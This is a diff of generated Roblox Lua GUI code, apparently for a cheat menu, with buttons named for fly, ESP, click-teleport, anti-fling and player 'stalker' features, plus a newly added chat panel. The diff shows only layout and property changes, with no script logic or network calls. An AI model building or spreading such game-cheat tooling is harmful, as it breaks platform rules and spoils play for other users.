@@ -27,243 +27,241 @@ local Converted = {
 	["_tecla H"] = Instance.new("TextLabel");
 	["_UITextSizeConstraint4"] = Instance.new("UITextSizeConstraint");
 	["_UICorner1"] = Instance.new("UICorner");
-	["_Chat"] = Instance.new("Frame");
-	["_UICorner2"] = Instance.new("UICorner");
 	["_movi"] = Instance.new("Frame");
 	["_AtalhosManager"] = Instance.new("LocalScript");
-	["_UICorner3"] = Instance.new("UICorner");
+	["_UICorner2"] = Instance.new("UICorner");
 	["_ScrollingFrame"] = Instance.new("ScrollingFrame");
 	["_UIGridLayout"] = Instance.new("UIGridLayout");
 	["_UIPadding"] = Instance.new("UIPadding");
 	["_reverseButton"] = Instance.new("TextButton");
 	["_LocalScript4"] = Instance.new("LocalScript");
-	["_UICorner4"] = Instance.new("UICorner");
+	["_UICorner3"] = Instance.new("UICorner");
 	["_tecla"] = Instance.new("TextBox");
 	["_UITextSizeConstraint5"] = Instance.new("UITextSizeConstraint");
-	["_UICorner5"] = Instance.new("UICorner");
+	["_UICorner4"] = Instance.new("UICorner");
 	["_UITextSizeConstraint6"] = Instance.new("UITextSizeConstraint");
 	["_UIStroke1"] = Instance.new("UIStroke");
 	["_TextLabel"] = Instance.new("TextLabel");
 	["_femotesButton"] = Instance.new("TextButton");
 	["_LocalScript5"] = Instance.new("LocalScript");
-	["_UICorner6"] = Instance.new("UICorner");
+	["_UICorner5"] = Instance.new("UICorner");
 	["_UITextSizeConstraint7"] = Instance.new("UITextSizeConstraint");
 	["_UIStroke2"] = Instance.new("UIStroke");
 	["_TextLabel1"] = Instance.new("TextLabel");
 	["_clicktpButton"] = Instance.new("TextButton");
 	["_LocalScript6"] = Instance.new("LocalScript");
-	["_UICorner7"] = Instance.new("UICorner");
+	["_UICorner6"] = Instance.new("UICorner");
 	["_keybutton"] = Instance.new("TextBox");
 	["_UITextSizeConstraint8"] = Instance.new("UITextSizeConstraint");
-	["_UICorner8"] = Instance.new("UICorner");
+	["_UICorner7"] = Instance.new("UICorner");
 	["_UITextSizeConstraint9"] = Instance.new("UITextSizeConstraint");
 	["_TextLabel2"] = Instance.new("TextLabel");
 	["_UIStroke3"] = Instance.new("UIStroke");
 	["_VoarButton"] = Instance.new("TextButton");
 	["_Fly"] = Instance.new("LocalScript");
 	["_UITextSizeConstraint10"] = Instance.new("UITextSizeConstraint");
-	["_UICorner9"] = Instance.new("UICorner");
+	["_UICorner8"] = Instance.new("UICorner");
 	["_TextLabel3"] = Instance.new("TextLabel");
 	["_UITextSizeConstraint11"] = Instance.new("UITextSizeConstraint");
 	["_keybutton1"] = Instance.new("TextBox");
-	["_UICorner10"] = Instance.new("UICorner");
+	["_UICorner9"] = Instance.new("UICorner");
 	["_UITextSizeConstraint12"] = Instance.new("UITextSizeConstraint");
 	["_UIStroke4"] = Instance.new("UIStroke");
 	["_FantasmaVerButton"] = Instance.new("TextButton");
 	["_LocalScript7"] = Instance.new("LocalScript");
 	["_UITextSizeConstraint13"] = Instance.new("UITextSizeConstraint");
-	["_UICorner11"] = Instance.new("UICorner");
+	["_UICorner10"] = Instance.new("UICorner");
 	["_TextLabel4"] = Instance.new("TextLabel");
 	["_UITextSizeConstraint14"] = Instance.new("UITextSizeConstraint");
 	["_keybutton2"] = Instance.new("TextBox");
-	["_UICorner12"] = Instance.new("UICorner");
+	["_UICorner11"] = Instance.new("UICorner");
 	["_UITextSizeConstraint15"] = Instance.new("UITextSizeConstraint");
 	["_UIStroke5"] = Instance.new("UIStroke");
 	["_EspButton"] = Instance.new("TextButton");
 	["_LocalScript8"] = Instance.new("LocalScript");
-	["_UICorner13"] = Instance.new("UICorner");
+	["_UICorner12"] = Instance.new("UICorner");
 	["_keybutton3"] = Instance.new("TextBox");
 	["_UITextSizeConstraint16"] = Instance.new("UITextSizeConstraint");
-	["_UICorner14"] = Instance.new("UICorner");
+	["_UICorner13"] = Instance.new("UICorner");
 	["_UITextSizeConstraint17"] = Instance.new("UITextSizeConstraint");
 	["_UIStroke6"] = Instance.new("UIStroke");
 	["_TextLabel5"] = Instance.new("TextLabel");
 	["_antiflingButton"] = Instance.new("TextButton");
 	["_LocalScript9"] = Instance.new("LocalScript");
 	["_UITextSizeConstraint18"] = Instance.new("UITextSizeConstraint");
-	["_UICorner15"] = Instance.new("UICorner");
+	["_UICorner14"] = Instance.new("UICorner");
 	["_TextLabel6"] = Instance.new("TextLabel");
 	["_UITextSizeConstraint19"] = Instance.new("UITextSizeConstraint");
 	["_keybutton4"] = Instance.new("TextBox");
-	["_UICorner16"] = Instance.new("UICorner");
+	["_UICorner15"] = Instance.new("UICorner");
 	["_UITextSizeConstraint20"] = Instance.new("UITextSizeConstraint");
 	["_UIStroke7"] = Instance.new("UIStroke");
-	["_UICorner17"] = Instance.new("UICorner");
+	["_UICorner16"] = Instance.new("UICorner");
 	["_UIListLayout"] = Instance.new("UIListLayout");
 	["_ScrollingFrame1"] = Instance.new("ScrollingFrame");
 	["_UIPadding1"] = Instance.new("UIPadding");
 	["_RunButton"] = Instance.new("TextButton");
 	["_LocalScript10"] = Instance.new("LocalScript");
 	["_UITextSizeConstraint21"] = Instance.new("UITextSizeConstraint");
-	["_UICorner18"] = Instance.new("UICorner");
+	["_UICorner17"] = Instance.new("UICorner");
 	["_GirarButton"] = Instance.new("TextButton");
 	["_LocalScript11"] = Instance.new("LocalScript");
 	["_UITextSizeConstraint22"] = Instance.new("UITextSizeConstraint");
+	["_UICorner18"] = Instance.new("UICorner");
 	["_UICorner19"] = Instance.new("UICorner");
-	["_UICorner20"] = Instance.new("UICorner");
 	["_UIGridLayout1"] = Instance.new("UIGridLayout");
 	["_UIPadding2"] = Instance.new("UIPadding");
 	["_anima��es"] = Instance.new("Frame");
 	["_vampiro"] = Instance.new("TextButton");
 	["_LocalScript12"] = Instance.new("LocalScript");
-	["_UICorner21"] = Instance.new("UICorner");
+	["_UICorner20"] = Instance.new("UICorner");
 	["_UITextSizeConstraint23"] = Instance.new("UITextSizeConstraint");
 	["_zumbie"] = Instance.new("TextButton");
 	["_LocalScript13"] = Instance.new("LocalScript");
-	["_UICorner22"] = Instance.new("UICorner");
+	["_UICorner21"] = Instance.new("UICorner");
 	["_UITextSizeConstraint24"] = Instance.new("UITextSizeConstraint");
 	["_adidas"] = Instance.new("TextButton");
 	["_LocalScript14"] = Instance.new("LocalScript");
-	["_UICorner23"] = Instance.new("UICorner");
+	["_UICorner22"] = Instance.new("UICorner");
 	["_UITextSizeConstraint25"] = Instance.new("UITextSizeConstraint");
 	["_Bolhoso"] = Instance.new("TextButton");
 	["_LocalScript15"] = Instance.new("LocalScript");
-	["_UICorner24"] = Instance.new("UICorner");
+	["_UICorner23"] = Instance.new("UICorner");
 	["_UITextSizeConstraint26"] = Instance.new("UITextSizeConstraint");
 	["_ninja"] = Instance.new("TextButton");
 	["_LocalScript16"] = Instance.new("LocalScript");
-	["_UICorner25"] = Instance.new("UICorner");
+	["_UICorner24"] = Instance.new("UICorner");
 	["_UITextSizeConstraint27"] = Instance.new("UITextSizeConstraint");
 	["_lobo"] = Instance.new("TextButton");
 	["_LocalScript17"] = Instance.new("LocalScript");
-	["_UICorner26"] = Instance.new("UICorner");
+	["_UICorner25"] = Instance.new("UICorner");
 	["_UITextSizeConstraint28"] = Instance.new("UITextSizeConstraint");
 	["_mago"] = Instance.new("TextButton");
 	["_LocalScript18"] = Instance.new("LocalScript");
-	["_UICorner27"] = Instance.new("UICorner");
+	["_UICorner26"] = Instance.new("UICorner");
 	["_UITextSizeConstraint29"] = Instance.new("UITextSizeConstraint");
 	["_levitar"] = Instance.new("TextButton");
 	["_LocalScript19"] = Instance.new("LocalScript");
-	["_UICorner28"] = Instance.new("UICorner");
+	["_UICorner27"] = Instance.new("UICorner");
 	["_UITextSizeConstraint30"] = Instance.new("UITextSizeConstraint");
 	["_cartoon"] = Instance.new("TextButton");
 	["_LocalScript20"] = Instance.new("LocalScript");
-	["_UICorner29"] = Instance.new("UICorner");
+	["_UICorner28"] = Instance.new("UICorner");
 	["_UITextSizeConstraint31"] = Instance.new("UITextSizeConstraint");
 	["_amazon"] = Instance.new("TextButton");
 	["_LocalScript21"] = Instance.new("LocalScript");
-	["_UICorner30"] = Instance.new("UICorner");
+	["_UICorner29"] = Instance.new("UICorner");
 	["_UITextSizeConstraint32"] = Instance.new("UITextSizeConstraint");
 	["_astronauta"] = Instance.new("TextButton");
 	["_LocalScript22"] = Instance.new("LocalScript");
-	["_UICorner31"] = Instance.new("UICorner");
+	["_UICorner30"] = Instance.new("UICorner");
 	["_UITextSizeConstraint33"] = Instance.new("UITextSizeConstraint");
 	["_superhero"] = Instance.new("TextButton");
 	["_LocalScript23"] = Instance.new("LocalScript");
-	["_UICorner32"] = Instance.new("UICorner");
+	["_UICorner31"] = Instance.new("UICorner");
 	["_UITextSizeConstraint34"] = Instance.new("UITextSizeConstraint");
 	["_antiga"] = Instance.new("TextButton");
 	["_LocalScript24"] = Instance.new("LocalScript");
-	["_UICorner33"] = Instance.new("UICorner");
+	["_UICorner32"] = Instance.new("UICorner");
 	["_UITextSizeConstraint35"] = Instance.new("UITextSizeConstraint");
 	["_Estileira"] = Instance.new("TextButton");
 	["_LocalScript25"] = Instance.new("LocalScript");
-	["_UICorner34"] = Instance.new("UICorner");
+	["_UICorner33"] = Instance.new("UICorner");
 	["_UITextSizeConstraint36"] = Instance.new("UITextSizeConstraint");
 	["_Rob�"] = Instance.new("TextButton");
 	["_LocalScript26"] = Instance.new("LocalScript");
-	["_UICorner35"] = Instance.new("UICorner");
+	["_UICorner34"] = Instance.new("UICorner");
 	["_UITextSizeConstraint37"] = Instance.new("UITextSizeConstraint");
 	["_Elf"] = Instance.new("TextButton");
 	["_LocalScript27"] = Instance.new("LocalScript");
-	["_UICorner36"] = Instance.new("UICorner");
+	["_UICorner35"] = Instance.new("UICorner");
 	["_UITextSizeConstraint38"] = Instance.new("UITextSizeConstraint");
 	["_Velho"] = Instance.new("TextButton");
 	["_LocalScript28"] = Instance.new("LocalScript");
-	["_UICorner37"] = Instance.new("UICorner");
+	["_UICorner36"] = Instance.new("UICorner");
 	["_UITextSizeConstraint39"] = Instance.new("UITextSizeConstraint");
 	["_Walmart"] = Instance.new("TextButton");
 	["_LocalScript29"] = Instance.new("LocalScript");
-	["_UICorner38"] = Instance.new("UICorner");
+	["_UICorner37"] = Instance.new("UICorner");
 	["_UITextSizeConstraint40"] = Instance.new("UITextSizeConstraint");
 	["_malvada"] = Instance.new("TextButton");
 	["_LocalScript30"] = Instance.new("LocalScript");
-	["_UICorner39"] = Instance.new("UICorner");
+	["_UICorner38"] = Instance.new("UICorner");
 	["_UITextSizeConstraint41"] = Instance.new("UITextSizeConstraint");
 	["_Brinquedo"] = Instance.new("TextButton");
 	["_LocalScript31"] = Instance.new("LocalScript");
-	["_UICorner40"] = Instance.new("UICorner");
+	["_UICorner39"] = Instance.new("UICorner");
 	["_UITextSizeConstraint42"] = Instance.new("UITextSizeConstraint");
 	["_superhero1"] = Instance.new("TextButton");
 	["_LocalScript32"] = Instance.new("LocalScript");
-	["_UICorner41"] = Instance.new("UICorner");
+	["_UICorner40"] = Instance.new("UICorner");
 	["_UITextSizeConstraint43"] = Instance.new("UITextSizeConstraint");
 	["_Through Life"] = Instance.new("TextButton");
 	["_LocalScript33"] = Instance.new("LocalScript");
-	["_UICorner42"] = Instance.new("UICorner");
+	["_UICorner41"] = Instance.new("UICorner");
 	["_UITextSizeConstraint44"] = Instance.new("UITextSizeConstraint");
 	["_superhero2"] = Instance.new("TextButton");
 	["_LocalScript34"] = Instance.new("LocalScript");
-	["_UICorner43"] = Instance.new("UICorner");
+	["_UICorner42"] = Instance.new("UICorner");
 	["_UITextSizeConstraint45"] = Instance.new("UITextSizeConstraint");
 	["_Glow"] = Instance.new("TextButton");
 	["_LocalScript35"] = Instance.new("LocalScript");
-	["_UICorner44"] = Instance.new("UICorner");
+	["_UICorner43"] = Instance.new("UICorner");
 	["_UITextSizeConstraint46"] = Instance.new("UITextSizeConstraint");
 	["_UIGridLayout2"] = Instance.new("UIGridLayout");
-	["_UICorner45"] = Instance.new("UICorner");
+	["_UICorner44"] = Instance.new("UICorner");
 	["_UIPadding3"] = Instance.new("UIPadding");
 	["_voxUp"] = Instance.new("Frame");
-	["_UICorner46"] = Instance.new("UICorner");
+	["_UICorner45"] = Instance.new("UICorner");
 	["_UIPadding4"] = Instance.new("UIPadding");
 	["_RoVibes"] = Instance.new("ScrollingFrame");
-	["_UICorner47"] = Instance.new("UICorner");
+	["_UICorner46"] = Instance.new("UICorner");
 	["_GrimoryButton"] = Instance.new("TextButton");
 	["_LocalScript36"] = Instance.new("LocalScript");
 	["_UITextSizeConstraint47"] = Instance.new("UITextSizeConstraint");
-	["_UICorner48"] = Instance.new("UICorner");
+	["_UICorner47"] = Instance.new("UICorner");
 	["_TextLabel7"] = Instance.new("TextLabel");
 	["_UITextSizeConstraint48"] = Instance.new("UITextSizeConstraint");
 	["_keybutton5"] = Instance.new("TextBox");
-	["_UICorner49"] = Instance.new("UICorner");
+	["_UICorner48"] = Instance.new("UICorner");
 	["_UITextSizeConstraint49"] = Instance.new("UITextSizeConstraint");
 	["_UIGridLayout3"] = Instance.new("UIGridLayout");
 	["_UIPadding5"] = Instance.new("UIPadding");
 	["_CandyButton"] = Instance.new("TextButton");
 	["_LocalScript37"] = Instance.new("LocalScript");
 	["_UITextSizeConstraint50"] = Instance.new("UITextSizeConstraint");
-	["_UICorner50"] = Instance.new("UICorner");
+	["_UICorner49"] = Instance.new("UICorner");
 	["_TextLabel8"] = Instance.new("TextLabel");
 	["_UITextSizeConstraint51"] = Instance.new("UITextSizeConstraint");
 	["_keybutton6"] = Instance.new("TextBox");
-	["_UICorner51"] = Instance.new("UICorner");
+	["_UICorner50"] = Instance.new("UICorner");
 	["_UITextSizeConstraint52"] = Instance.new("UITextSizeConstraint");
 	["_BoneButton"] = Instance.new("TextButton");
 	["_LocalScript38"] = Instance.new("LocalScript");
 	["_UITextSizeConstraint53"] = Instance.new("UITextSizeConstraint");
-	["_UICorner52"] = Instance.new("UICorner");
+	["_UICorner51"] = Instance.new("UICorner");
 	["_TextLabel9"] = Instance.new("TextLabel");
 	["_UITextSizeConstraint54"] = Instance.new("UITextSizeConstraint");
 	["_keybutton7"] = Instance.new("TextBox");
-	["_UICorner53"] = Instance.new("UICorner");
+	["_UICorner52"] = Instance.new("UICorner");
 	["_UITextSizeConstraint55"] = Instance.new("UITextSizeConstraint");
 	["_LoboButton"] = Instance.new("TextButton");
 	["_LocalScript39"] = Instance.new("LocalScript");
 	["_UITextSizeConstraint56"] = Instance.new("UITextSizeConstraint");
-	["_UICorner54"] = Instance.new("UICorner");
+	["_UICorner53"] = Instance.new("UICorner");
 	["_TextLabel10"] = Instance.new("TextLabel");
 	["_UITextSizeConstraint57"] = Instance.new("UITextSizeConstraint");
 	["_keybutton8"] = Instance.new("TextBox");
-	["_UICorner55"] = Instance.new("UICorner");
+	["_UICorner54"] = Instance.new("UICorner");
 	["_UITextSizeConstraint58"] = Instance.new("UITextSizeConstraint");
 	["_LuckButton"] = Instance.new("TextButton");
 	["_LocalScript40"] = Instance.new("LocalScript");
 	["_UITextSizeConstraint59"] = Instance.new("UITextSizeConstraint");
-	["_UICorner56"] = Instance.new("UICorner");
+	["_UICorner55"] = Instance.new("UICorner");
 	["_TextLabel11"] = Instance.new("TextLabel");
 	["_UITextSizeConstraint60"] = Instance.new("UITextSizeConstraint");
 	["_keybutton9"] = Instance.new("TextBox");
-	["_UICorner57"] = Instance.new("UICorner");
+	["_UICorner56"] = Instance.new("UICorner");
 	["_UITextSizeConstraint61"] = Instance.new("UITextSizeConstraint");
 	["_UIListLayout1"] = Instance.new("UIListLayout");
 	["_TextLabel12"] = Instance.new("TextLabel");
@@ -273,61 +271,84 @@ local Converted = {
 	["_SeachBox"] = Instance.new("TextBox");
 	["_seach"] = Instance.new("LocalScript");
 	["_UITextSizeConstraint62"] = Instance.new("UITextSizeConstraint");
+	["_UICorner57"] = Instance.new("UICorner");
 	["_UICorner58"] = Instance.new("UICorner");
-	["_UICorner59"] = Instance.new("UICorner");
 	["_Cmds"] = Instance.new("Frame");
 	["_verButton"] = Instance.new("TextButton");
 	["_LocalScript42"] = Instance.new("LocalScript");
-	["_UICorner60"] = Instance.new("UICorner");
+	["_UICorner59"] = Instance.new("UICorner");
 	["_UITextSizeConstraint63"] = Instance.new("UITextSizeConstraint");
 	["_syncButton"] = Instance.new("TextButton");
 	["_LocalScript43"] = Instance.new("LocalScript");
-	["_UICorner61"] = Instance.new("UICorner");
+	["_UICorner60"] = Instance.new("UICorner");
 	["_UITextSizeConstraint64"] = Instance.new("UITextSizeConstraint");
 	["_TpButton"] = Instance.new("TextButton");
 	["_LocalScript44"] = Instance.new("LocalScript");
-	["_UICorner62"] = Instance.new("UICorner");
+	["_UICorner61"] = Instance.new("UICorner");
 	["_UITextSizeConstraint65"] = Instance.new("UITextSizeConstraint");
 	["_UIGridLayout4"] = Instance.new("UIGridLayout");
 	["_carinhoButton"] = Instance.new("TextButton");
 	["_LocalScript45"] = Instance.new("LocalScript");
-	["_UICorner63"] = Instance.new("UICorner");
+	["_UICorner62"] = Instance.new("UICorner");
 	["_UITextSizeConstraint66"] = Instance.new("UITextSizeConstraint");
 	["_UIPadding6"] = Instance.new("UIPadding");
 	["_Lista"] = Instance.new("ScrollingFrame");
 	["_Banner"] = Instance.new("TextButton");
-	["_UICorner64"] = Instance.new("UICorner");
+	["_UICorner63"] = Instance.new("UICorner");
 	["_UIPadding7"] = Instance.new("UIPadding");
 	["_UIGridLayout5"] = Instance.new("UIGridLayout");
-	["_UICorner65"] = Instance.new("UICorner");
+	["_UICorner64"] = Instance.new("UICorner");
 	["_menu"] = Instance.new("Frame");
-	["_UICorner66"] = Instance.new("UICorner");
+	["_UICorner65"] = Instance.new("UICorner");
 	["_voxupButton"] = Instance.new("TextButton");
-	["_UICorner67"] = Instance.new("UICorner");
+	["_UICorner66"] = Instance.new("UICorner");
 	["_UITextSizeConstraint67"] = Instance.new("UITextSizeConstraint");
 	["_TextLabel14"] = Instance.new("TextLabel");
 	["_stalkerButton"] = Instance.new("TextButton");
-	["_UICorner68"] = Instance.new("UICorner");
+	["_UICorner67"] = Instance.new("UICorner");
 	["_UITextSizeConstraint68"] = Instance.new("UITextSizeConstraint");
 	["_TextLabel15"] = Instance.new("TextLabel");
 	["_animaButton"] = Instance.new("TextButton");
-	["_UICorner69"] = Instance.new("UICorner");
+	["_UICorner68"] = Instance.new("UICorner");
 	["_UITextSizeConstraint69"] = Instance.new("UITextSizeConstraint");
 	["_TextLabel16"] = Instance.new("TextLabel");
 	["_MoviButton"] = Instance.new("TextButton");
-	["_UICorner70"] = Instance.new("UICorner");
+	["_UICorner69"] = Instance.new("UICorner");
 	["_UITextSizeConstraint70"] = Instance.new("UITextSizeConstraint");
 	["_TextLabel17"] = Instance.new("TextLabel");
 	["_ConfigButton"] = Instance.new("TextButton");
-	["_UICorner71"] = Instance.new("UICorner");
+	["_UICorner70"] = Instance.new("UICorner");
 	["_UITextSizeConstraint71"] = Instance.new("UITextSizeConstraint");
 	["_TextLabel18"] = Instance.new("TextLabel");
 	["_UIListLayout2"] = Instance.new("UIListLayout");
 	["_UIPadding8"] = Instance.new("UIPadding");
-	["_UIAspectRatioConstraint"] = Instance.new("UIAspectRatioConstraint");
+	["_ChatButton"] = Instance.new("TextButton");
+	["_UICorner71"] = Instance.new("UICorner");
+	["_UITextSizeConstraint72"] = Instance.new("UITextSizeConstraint");
+	["_TextLabel19"] = Instance.new("TextLabel");
 	["_hpx"] = Instance.new("TextLabel");
+	["_UIAspectRatioConstraint"] = Instance.new("UIAspectRatioConstraint");
 	["_UIStroke8"] = Instance.new("UIStroke");
 	["_Versao"] = Instance.new("TextLabel");
+	["_ChatFrame"] = Instance.new("Frame");
+	["_UICorner72"] = Instance.new("UICorner");
+	["_UIPadding9"] = Instance.new("UIPadding");
+	["_UIListLayout3"] = Instance.new("UIListLayout");
+	["_Drucord"] = Instance.new("TextLabel");
+	["_ImageLabel1"] = Instance.new("ImageLabel");
+	["_Chat"] = Instance.new("ImageLabel");
+	["_LocalScript46"] = Instance.new("LocalScript");
+	["_UICorner73"] = Instance.new("UICorner");
+	["_escrita"] = Instance.new("TextBox");
+	["_UICorner74"] = Instance.new("UICorner");
+	["_UIPadding10"] = Instance.new("UIPadding");
+	["_UITextSizeConstraint73"] = Instance.new("UITextSizeConstraint");
+	["_Enviar"] = Instance.new("ImageButton");
+	["_UICorner75"] = Instance.new("UICorner");
+	["_ImageLabel2"] = Instance.new("ImageLabel");
+	["_online"] = Instance.new("TextLabel");
+	["_UITextSizeConstraint74"] = Instance.new("UITextSizeConstraint");
+	["_LocalScript47"] = Instance.new("LocalScript");
 }
 
 -- Properties:
@@ -349,6 +370,7 @@ Converted["_configUS"].BorderColor3 = Color3.fromRGB(0, 0, 0)
 Converted["_configUS"].BorderSizePixel = 0
 Converted["_configUS"].Position = UDim2.new(0.31099999, 0, 0.167999998, 0)
 Converted["_configUS"].Size = UDim2.new(0.675999999, 0, 0.809000015, 0)
+Converted["_configUS"].Visible = false
 Converted["_configUS"].ZIndex = 10
 Converted["_configUS"].Name = "configUS"
 Converted["_configUS"].Parent = Converted["_mainFrame"]
@@ -476,36 +498,22 @@ Converted["_UICorner1"].TopLeftRadius = UDim.new(0.0199999996, 0)
 Converted["_UICorner1"].TopRightRadius = UDim.new(0.0199999996, 0)
 Converted["_UICorner1"].Parent = Converted["_configUS"]
 
-Converted["_Chat"].BackgroundColor3 = Color3.fromRGB(57.00000420212746, 71.00000336766243, 106.00000888109207)
-Converted["_Chat"].BorderColor3 = Color3.fromRGB(0, 0, 0)
-Converted["_Chat"].BorderSizePixel = 0
-Converted["_Chat"].Position = UDim2.new(0.0324884467, 0, 0.469009072, 0)
-Converted["_Chat"].Size = UDim2.new(0.944485605, 0, 0.504601479, 0)
-Converted["_Chat"].Name = "Chat"
-Converted["_Chat"].Parent = Converted["_configUS"]
+Converted["_movi"].BackgroundColor3 = Color3.fromRGB(24.000000469386578, 30.00000011175871, 45.00000111758709)
+Converted["_movi"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_movi"].BorderSizePixel = 0
+Converted["_movi"].Position = UDim2.new(0.31099999, 0, 0.167999998, 0)
+Converted["_movi"].Size = UDim2.new(0.675999999, 0, 0.809000015, 0)
+Converted["_movi"].Visible = false
+Converted["_movi"].ZIndex = 10
+Converted["_movi"].Name = "movi"
+Converted["_movi"].Parent = Converted["_mainFrame"]
 
 Converted["_UICorner2"].BottomLeftRadius = UDim.new(0.0199999996, 0)
 Converted["_UICorner2"].BottomRightRadius = UDim.new(0.0199999996, 0)
 Converted["_UICorner2"].CornerRadius = UDim.new(0.0199999996, 0)
 Converted["_UICorner2"].TopLeftRadius = UDim.new(0.0199999996, 0)
 Converted["_UICorner2"].TopRightRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner2"].Parent = Converted["_Chat"]
-
-Converted["_movi"].BackgroundColor3 = Color3.fromRGB(24.000000469386578, 30.00000011175871, 45.00000111758709)
-Converted["_movi"].BorderColor3 = Color3.fromRGB(0, 0, 0)
-Converted["_movi"].BorderSizePixel = 0
-Converted["_movi"].Position = UDim2.new(0.31099999, 0, 0.167999998, 0)
-Converted["_movi"].Size = UDim2.new(0.675999999, 0, 0.809000015, 0)
-Converted["_movi"].ZIndex = 10
-Converted["_movi"].Name = "movi"
-Converted["_movi"].Parent = Converted["_mainFrame"]
-
-Converted["_UICorner3"].BottomLeftRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner3"].BottomRightRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner3"].CornerRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner3"].TopLeftRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner3"].TopRightRadius = UDim.new(0.0199999996, 0)
-Converted["_UICorner3"].Parent = Converted["_movi"]
+Converted["_UICorner2"].Parent = Converted["_movi"]
 
 Converted["_ScrollingFrame"].ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
 Converted["_ScrollingFrame"].ScrollBarThickness = 0
@@ -542,12 +550,12 @@ Converted["_reverseButton"].Size = UDim2.new(0, 200, 0, 50)
 Converted["_reverseButton"].Name = "reverseButton"
 Converted["_reverseButton"].Parent = Converted["_ScrollingFrame"]
 
-Converted["_UICorner4"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner4"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner4"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner4"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner4"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner4"].Parent = Converted["_reverseButton"]
+Converted["_UICorner3"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner3"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner3"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner3"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner3"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner3"].Parent = Converted["_reverseButton"]
 
 Converted["_tecla"].Font = Enum.Font.FredokaOne
 Converted["_tecla"].PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
@@ -569,12 +577,12 @@ Converted["_tecla"].Parent = Converted["_reverseButton"]
 Converted["_UITextSizeConstraint5"].MaxTextSize = 20
 Converted["_UITextSizeConstraint5"].Parent = Converted["_tecla"]
 
-Converted["_UICorner5"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner5"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner5"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner5"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner5"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner5"].Parent = Converted["_tecla"]
+Converted["_UICorner4"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner4"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner4"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner4"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner4"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner4"].Parent = Converted["_tecla"]
 
 Converted["_UITextSizeConstraint6"].MaxTextSize = 25
 Converted["_UITextSizeConstraint6"].Parent = Converted["_reverseButton"]
@@ -615,12 +623,12 @@ Converted["_femotesButton"].Size = UDim2.new(0.364944547, 0, 0.105154641, 0)
 Converted["_femotesButton"].Name = "femotesButton"
 Converted["_femotesButton"].Parent = Converted["_ScrollingFrame"]
 
-Converted["_UICorner6"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner6"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner6"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner6"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner6"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner6"].Parent = Converted["_femotesButton"]
+Converted["_UICorner5"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner5"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner5"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner5"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner5"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner5"].Parent = Converted["_femotesButton"]
 
 Converted["_UITextSizeConstraint7"].MaxTextSize = 20
 Converted["_UITextSizeConstraint7"].Parent = Converted["_femotesButton"]
@@ -658,12 +666,12 @@ Converted["_clicktpButton"].Size = UDim2.new(0, 200, 0, 50)
 Converted["_clicktpButton"].Name = "clicktpButton"
 Converted["_clicktpButton"].Parent = Converted["_ScrollingFrame"]
 
-Converted["_UICorner7"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner7"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner7"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner7"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner7"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner7"].Parent = Converted["_clicktpButton"]
+Converted["_UICorner6"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner6"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner6"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner6"].TopLeftRadius = UDim.new(0, 9)
+Converted["_UICorner6"].TopRightRadius = UDim.new(0, 9)
+Converted["_UICorner6"].Parent = Converted["_clicktpButton"]
 
 Converted["_keybutton"].Font = Enum.Font.FredokaOne
 Converted["_keybutton"].PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
@@ -685,12 +693,12 @@ Converted["_keybutton"].Parent = Converted["_clicktpButton"]
 Converted["_UITextSizeConstraint8"].MaxTextSize = 20
 Converted["_UITextSizeConstraint8"].Parent = Converted["_keybutton"]
 
-Converted["_UICorner8"].BottomLeftRadius = UDim.new(0, 9)
-Converted["_UICorner8"].BottomRightRadius = UDim.new(0, 9)
-Converted["_UICorner8"].CornerRadius = UDim.new(0, 9)
-Converted["_UICorner8"].TopLeftRadius = UDim.new(0, 9)
-Converted["_UICorner8"].TopRightRadius = UDim.new(0, 9)
-Converted["_UICorner8"].Parent = Converted["_keybutton"]
+Converted["_UICorner7"].BottomLeftRadius = UDim.new(0, 9)
+Converted["_UICorner7"].BottomRightRadius = UDim.new(0, 9)
+Converted["_UICorner7"].CornerRadius = UDim.new(0, 9)
+Converted["_UICorner7"].TopLeftRadius = UDim.new(0, 9)
